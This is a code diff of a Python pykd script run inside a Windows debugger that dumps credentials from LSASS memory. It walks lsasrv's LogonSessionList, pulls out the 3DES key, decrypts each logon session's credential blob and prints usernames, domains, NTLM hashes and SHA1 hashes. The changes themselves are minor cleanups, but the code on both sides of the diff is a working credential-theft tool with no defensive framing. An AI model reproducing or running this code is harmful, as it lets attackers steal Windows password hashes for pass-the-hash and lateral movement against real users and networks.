@@ -39,7 +39,7 @@ def main():
             username = user_data[0].split('  ')[1]
             logondomain = user_data[1].split('  ')[1]
             #print([user_data, username, logondomain])
-            userdomain.append([user_data, username, logondomain])
+            userdomain.append([username, logondomain])
         #print(userdomain)
     except IndexError:
         error_log()
@@ -49,10 +49,10 @@ def main():
 
     # retrieve crypto blob from each user
     crypto_blob = (pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B8\" poi(lsasrv!LogonSessionList)"))
-    print(crypto_blob)
+    #print(crypto_blob)
     crypto_blob = crypto_blob.split('\n\n')
-    print(crypto_blob)
-    print(len(crypto_blob))
+    #print(crypto_blob)
+    #print(len(crypto_blob))
 
     # find 3DES key
     tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")
@@ -62,37 +62,29 @@ def main():
     print("\n(*) 3des key")
     print(hexlify(tripdes_key))
 
-    for k in range(0, len(crypto_blob)-1):
+    for i in range(0, len(crypto_blob)-1):
         # saves the user's blob
-        user_crypto  = ''.join(crypto_blob[k].split('  ')[1::2])
+        user_crypto  = ''.join(crypto_blob[i].split('  ')[1::2])
 
         # dump encrypted bytes
         user_crypto_neato = user_crypto.split('  ')[1::2]
         crypto = ''.join(user_crypto_neato)
-        print("(*) dump encrypted bytes")
-        print(crypto)
+        #print("(*) dump encrypted bytes")
+        #print(crypto)
         try:
             user_crypto =  unhexlify(user_crypto.replace(" ", "").replace("-",""))
         except binascii.Error:
             error_log()
-        print("\n(*) user's crypto")
-        print(hexlify(user_crypto))
+        #print("\n(*) user's crypto")
+        #print(hexlify(user_crypto))
 
         # decrypting the blob - the iv can be anything sinc CBC is not using it
         k = triple_des(tripdes_key, CBC,bytes.fromhex('deadbeefdeadbeef'))
         a = k.decrypt(user_crypto)
-        print(hexdump(a[0x180:]))
-        userdoamin = a[0x180:]
-        a_str = str(hexlify(a))
-        print(a_str)
-        userdoamin_str = str(hexlify(userdoamin)).replace("000000", "000a00")
-        if len(userdoamin_str) % 2 == 1:
-            userdoamin_str = userdoamin_str[2:-1]
-        print(userdoamin_str)
-        userdoamin_str = bytes.fromhex(userdoamin_str).decode('utf-16').split('\n')
-        ntlm,sha1 = a_str[150:182], a_str[214:254]
-        print("\n(*)LOGONDOMAIN : " + userdoamin_str[0])
-        print("(*)USERNAME : " + userdoamin_str[1])
+        a = str(hexlify(a))
+        ntlm,sha1 = a[150:182], a[214:254]
+        print("\n(*)LOGONDOMAIN : " + userdomain[i][0])
+        print("(*)USERNAME : " + userdomain[i][1])
         print("(*)NTLM : " + ntlm)
         print("(*)SHA1 : " + sha1)
 
